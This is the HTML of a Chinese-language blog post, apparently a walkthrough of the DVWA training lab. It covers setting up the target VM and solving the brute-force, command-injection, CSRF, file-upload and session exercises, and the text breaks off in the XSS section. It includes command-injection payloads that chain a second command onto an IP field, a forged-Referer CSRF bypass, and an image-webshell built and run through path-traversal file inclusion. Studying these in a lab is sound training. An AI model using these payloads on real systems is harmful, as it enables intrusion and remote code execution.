@@ -1,0 +1,947 @@
+  <!DOCTYPE html>
+  <html lang="en"  
+      data-theme-mode="auto"
+  >
+  <head>
+  <meta charset="utf-8">
+  
+  
+  
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://cl1ck-t0.github.io';</script>
+  <title>
+    DVWA security | Cl1ck-t0&#39;s blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic|Noto Serif SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media='all'">
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="DVWA security  一、靶机的搭建 窝本来是想和往常一样用phpstudy启动靶场服务的，突然不想这么干，于是窝再建立了一个虚拟机，在网上找了一个服务器安装镜像 Ubuntu 22.04.5 LTS（Jammy Jellyfish） 准备搞一个无图形用户界面纯命令行的靶机（毕竟只是一个靶机不需要其他功能，至于为什么不用kali作为靶机，是因为ubuntu比较小emmmmmm，随便给点配">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA security">
+<meta property="og:url" content="https://cl1ck-t0.github.io/2026/07/31/DVWA-security/index.html">
+<meta property="og:site_name" content="Cl1ck-t0&#39;s blog">
+<meta property="og:description" content="DVWA security  一、靶机的搭建 窝本来是想和往常一样用phpstudy启动靶场服务的，突然不想这么干，于是窝再建立了一个虚拟机，在网上找了一个服务器安装镜像 Ubuntu 22.04.5 LTS（Jammy Jellyfish） 准备搞一个无图形用户界面纯命令行的靶机（毕竟只是一个靶机不需要其他功能，至于为什么不用kali作为靶机，是因为ubuntu比较小emmmmmm，随便给点配">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s41.ax1x.com/2026/08/07/pm7BKTs.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Cl1ck-t0/image-bed/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-08-07%20102300.png">
+<meta property="article:published_time" content="2026-07-31T04:41:35.000Z">
+<meta property="article:modified_time" content="2026-08-07T04:07:28.320Z">
+<meta property="article:author" content="Cl1ck-t0">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s41.ax1x.com/2026/08/07/pm7BKTs.png">
+    <link rel="alternate" href="/atom.xml" title="Cl1ck-t0's blog" type="application/atom+xml">
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx/1oA/0l8ysE" crossorigin="anonymous">
+      <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css" integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz+YI" crossorigin="anonymous">
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+    <link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.css" integrity="sha384-tLMkTWh2pfXNWGFlUS0w1TFtRG5xZ9lPWFOooj+vDDLIL+xBGQU/voDBY5XE2lVh" crossorigin="anonymous">
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+  <body>
+      <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+      </div>
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script>
+<div id="copy-tooltip"></div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation">
+        <a class="main-nav-link-wrap" href="/">
+          <span class="main-nav-link">Home</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/archives">
+          <span class="main-nav-link">Archives</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/about">
+          <span class="main-nav-link">About</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/friend">
+          <span class="main-nav-link">Friend</span>
+        </span>
+        <a class="main-nav-link-wrap" href="/atom.xml">
+          <span class="main-nav-link">rss</span>
+        </span>
+    <a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation">
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" aria-label="RSS Feed" target="_blank"></a>
+  </nav>
+</div>
+<header id="header" aria-label="Site header">
+        <picture>
+        </picture>
+          <img  fetchpriority="high" src="/images/banner.webp" alt="DVWA security">
+  <div id="header-outer">
+    <div id="header-title">
+          <span id="logo">
+            <h1 data-aos="slide-up">DVWA security</h1>
+          </span>
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+        </h2>
+    </div>
+  </div>
+</header>
+
+        <div id="content" aria-label="Page content"  class="sidebar-right" >
+          <aside id="sidebar" aria-label="Sidebar">
+  <div class="sidebar-wrapper-container sticky">
+      <meting-js
+        theme="var(--color-link)"
+        id="6868625065"
+        server="netease"
+        type="playlist"
+        
+        
+        autoplay="false"
+        loop="all"
+        order="list"
+        
+        volume="0.7"
+        mutex="true"
+        
+        
+      ></meting-js>
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#dvwa-security"><span class="toc-number">1.</span> <span class="toc-text"> DVWA security</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E9%9D%B6%E6%9C%BA%E7%9A%84%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、靶机的搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-%E9%9D%B6%E6%9C%BA%E5%AE%9E%E6%88%98"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、靶机实战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1low"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 1.low</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2meduim"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 2.Meduim</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1brute-force"><span class="toc-number">1.2.2.1.</span> <span class="toc-text"> 1）Brute Force</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2command-injection"><span class="toc-number">1.2.2.2.</span> <span class="toc-text"> 2）Command Injection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3csrf"><span class="toc-number">1.2.2.3.</span> <span class="toc-text"> 3）CSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">1.2.2.4.</span> <span class="toc-text"> 4）文件上传</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5weak-session-ids"><span class="toc-number">1.2.2.5.</span> <span class="toc-text"> 5）Weak Session IDs</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6xss_drs"><span class="toc-number">1.2.2.6.</span> <span class="toc-text"> 6）xss_d&amp;r&amp;s</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7content-security-policy-csp-bypass"><span class="toc-number">1.2.2.7.</span> <span class="toc-text"> 7）Content Security Policy (CSP) Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8javascript-attacks"><span class="toc-number">1.2.2.8.</span> <span class="toc-text"> 8）JavaScript Attacks</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#9authorisation-bypass"><span class="toc-number">1.2.2.9.</span> <span class="toc-text"> 9）Authorisation Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#10open-http-redirect"><span class="toc-number">1.2.2.10.</span> <span class="toc-text"> 10）Open HTTP Redirect</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3high"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 3.high</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1brute-force-2"><span class="toc-number">1.2.3.1.</span> <span class="toc-text"> 1）Brute Force</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2command-injection-2"><span class="toc-number">1.2.3.2.</span> <span class="toc-text"> 2）Command Injection</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3csrf-2"><span class="toc-number">1.2.3.3.</span> <span class="toc-text"> 3）CSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4xss_drs"><span class="toc-number">1.2.3.4.</span> <span class="toc-text"> 4）xss_d&amp;r&amp;s</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5sql"><span class="toc-number">1.2.3.5.</span> <span class="toc-text"> 5）SQL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6content-security-policy-csp-bypass"><span class="toc-number">1.2.3.6.</span> <span class="toc-text"> 6）Content Security Policy (CSP) Bypass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7authorisation-bypass"><span class="toc-number">1.2.3.7.</span> <span class="toc-text"> 7）Authorisation Bypass</span></a></li></ol></li></ol></li></ol></li></ol>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">32</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-rss sidebar-social-icon">
+      <a href=/atom.xml itemprop="url" target="_blank" aria-label="rss" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/atom.xml" aria-label="rss"></a>
+        <div class="sidebar-menu-link">rss</div>
+      </div>
+</div>
+</div>
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+    </div>
+  </div>
+  <div class="sidebar-widget">
+  </div>
+  </div>
+</aside>
+
+          <section id="main" aria-label="Main content"><article id="post-DVWA-security" class="h-entry article" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2026-07-31T04:41:35.000Z" itemprop="datePublished">2026-07-31</time>
+    <time style="display: none;" id="post-update-time">2026-08-07</time>
+  </span>
+</div>
+
+    </div>
+    
+    <div class="hr-line"></div>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+        <h1 id="dvwa-security"><a class="markdownIt-Anchor" href="#dvwa-security"></a> DVWA security</h1>
+<h2 id="一-靶机的搭建"><a class="markdownIt-Anchor" href="#一-靶机的搭建"></a> 一、靶机的搭建</h2>
+<p>窝本来是想和往常一样用phpstudy启动靶场服务的，突然不想这么干，于是窝再建立了一个虚拟机，在网上找了一个服务器安装镜像</p>
+<p><a target="_blank" rel="noopener" href="https://releases.ubuntu.com/22.04/">Ubuntu 22.04.5 LTS（Jammy Jellyfish）</a></p>
+<p>准备搞一个无图形用户界面纯命令行的靶机（毕竟只是一个靶机不需要其他功能，至于为什么不用kali作为靶机，是因为ubuntu比较小emmmmmm，随便给点配置就够用了）</p>
+<p>虚拟机的配置和以往差不多，可以先选择NET连接便于后续相关源码和工具的下载，运存2G完全够用了，毕竟是纯命令行）</p>
+<p>虚拟机配置完就打开，里面有一些虚拟机的详细配置，全部Done就行</p>
+<p>然后就是简单的下载资源：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="comment"># 1. 更新软件包列表</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install apache2 mysql-server php php-mysqli php-gd libapache2-mod-php unzip -y</span><br><span class="line"><span class="comment"># 2. 安装 Apache、MySQL、PHP 等必要服务</span></span><br></pre></td></tr></table></figure>
+<p>下载完直接OK就行</p>
+<p>然后进入web根目录，准备下载DVWA的源码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /var/www/html</span><br></pre></td></tr></table></figure>
+<p>这里不建议用wget直接连接github，速度慢，建议直接克隆一个：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install git -y</span><br><span class="line"><span class="built_in">sudo</span> git <span class="built_in">clone</span> https://github.com/digininja/DVWA.git dvwa</span><br></pre></td></tr></table></figure>
+<p>然后就是基础配置：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 复制配置文件</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">cp</span> /var/www/html/dvwa/config/config.inc.php.dist /var/www/html/dvwa/config/config.inc.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 设置目录权限（允许写入）</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> -R 777 /var/www/html/dvwa/hackable/uploads/</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> -R 777 /var/www/html/dvwa/config/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 启动 MySQL 服务</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl start mysql</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 设置 MySQL 开机自启</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl <span class="built_in">enable</span> mysql</span><br></pre></td></tr></table></figure>
+<p>DVWA配置文件搞好以后就开始配置数据库，后面就没什么好说的按部就班就行，后续可以使用kali或物理机直接访问进行练习</p>
+<h2 id="二-靶机实战"><a class="markdownIt-Anchor" href="#二-靶机实战"></a> 二、靶机实战</h2>
+<h3 id="1low"><a class="markdownIt-Anchor" href="#1low"></a> 1.low</h3>
+<p>防御等级低不作具体说明；</p>
+<h3 id="2meduim"><a class="markdownIt-Anchor" href="#2meduim"></a> 2.Meduim</h3>
+<h4 id="1brute-force"><a class="markdownIt-Anchor" href="#1brute-force"></a> 1）Brute Force</h4>
+<p>在low的基础上新增了sleep(2)函数，也就是爆破时间会长一点</p>
+<h4 id="2command-injection"><a class="markdownIt-Anchor" href="#2command-injection"></a> 2）Command Injection</h4>
+<p>对输入的ip地址进行ping操作，源码只让我们进行ping操作，没有其他动作，但它给了我们一个利用系统命令的平台。我们的目的就是利用ping命令同时执行其他动作</p>
+<p>于是我们补充一下命令连接符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&amp; ：前面一个命令无论是否执行，后面的命令都能执行，两个命令都执行</span><br><span class="line">&amp;&amp;：前面一个命令执行成功后，才能执行后面一个命令，两个命令都执行</span><br><span class="line">|：前面一个命令无论是否执行，后面的命令都能执行且只执行后面一个</span><br><span class="line">||：前面一个命令不能正常执行后，才能执行后面一个命令</span><br></pre></td></tr></table></figure>
+<p>low难度的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;dir</span><br><span class="line">127.0.0.1 | dir</span><br><span class="line">均被过滤</span><br></pre></td></tr></table></figure>
+<p>meduim难度：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; dir</span><br></pre></td></tr></table></figure>
+<p>即可</p>
+<h4 id="3csrf"><a class="markdownIt-Anchor" href="#3csrf"></a> 3）CSRF</h4>
+<p>原本low是可以直接通过url改动的，meduim明显行不通</p>
+<p>和Low等级比较发现，只有一处改变，即在传入密码和确认密码参数前先进行了一个if语句的判断，判断里面的内容主要是验证这个访问请求是否是从dwva网站本身发起的，若不是就不执行后面的操作</p>
+<p>于是我们抓包加一个Referer头即可</p>
+<h4 id="4文件上传"><a class="markdownIt-Anchor" href="#4文件上传"></a> 4）文件上传</h4>
+<p>这个不用多说，只要会改后缀就行</p>
+<p>这里直接顺便说说high难度：</p>
+<p>high难度在后端进行了后缀名的检查，ini和htaccess文件没办法使用，前面的方法也只能绕过前端</p>
+<p>试了半天上传不了，于是我们看看源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问：/dvwa/vulnerabilities/view_source.php?id=upload&amp;security=high</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">substr</span>( <span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpg&quot;</span> || <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpeg&quot;</span> || <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        <span class="title function_ invoke__">getimagesize</span>( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>现有的安全检查：</p>
+<ol>
+<li><strong>扩展名检查</strong>：只允许 <code>jpg</code>、<code>jpeg</code>、<code>png</code></li>
+<li><strong>文件大小限制</strong>：小于 100000 字节（约97KB）</li>
+<li><strong>图像验证</strong>：使用 <code>getimagesize()</code> 检查是否为真实图片</li>
+</ol>
+<p>既然有检查真实图片，那我们就不能简单的伪木马了，必须使用图片马：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 2.jpg/B + 1.php 3.jpg</span><br></pre></td></tr></table></figure>
+<p>这里简单解释一下：</p>
+<p>/B的作用是转换为二进制模式，防止文件损坏和读取错误</p>
+<p>3.jpg则是合成图片马的名字，生成的图片马在该命令执行的目录下。</p>
+<p>成功上传图片马，但是如何利用这个漏洞还是问题，</p>
+<p>于是我们想到了文件包含漏洞：</p>
+<p>获取上传图片马链接地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dvwa/hackable/uploads/3.jpg</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">或者直接路径穿越：/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/3.jpg</span><br></pre></td></tr></table></figure>
+<p>还有很神奇的，我去看了看大佬们的wp</p>
+<p>发现还能利用之前的命令注入模块：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|| ren C:\phpstudy_pro\WWW\DVWA-master\hackable\uploads\888.png 888.php </span><br><span class="line"></span><br><span class="line">`ren`可以修改名称，把png改为php绕过后端检测</span><br></pre></td></tr></table></figure>
+<p>Ubuntu不支持ren命令，用mv代替：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | mv ../../hackable/uploads/3.jpg ../../hackable/uploads/3.php</span><br></pre></td></tr></table></figure>
+<h4 id="5weak-session-ids"><a class="markdownIt-Anchor" href="#5weak-session-ids"></a> 5）Weak Session IDs</h4>
+<p>会话劫持</p>
+<p>low难度使用这个session ，到别的浏览器，直接修改session即可实现无密码登陆</p>
+<p>而medium难度则使用了时间戳</p>
+<p><a target="_blank" rel="noopener" href="https://remeins.com/index/app/timestamp#google_vignette">时间戳在线转换工具(Unix timestamp) </a></p>
+<h4 id="6xss_drs"><a class="markdownIt-Anchor" href="#6xss_drs"></a> 6）xss_d&amp;r&amp;s</h4>
+<p>依旧查看源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !<span class="title function_ invoke__">is_null</span> (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span 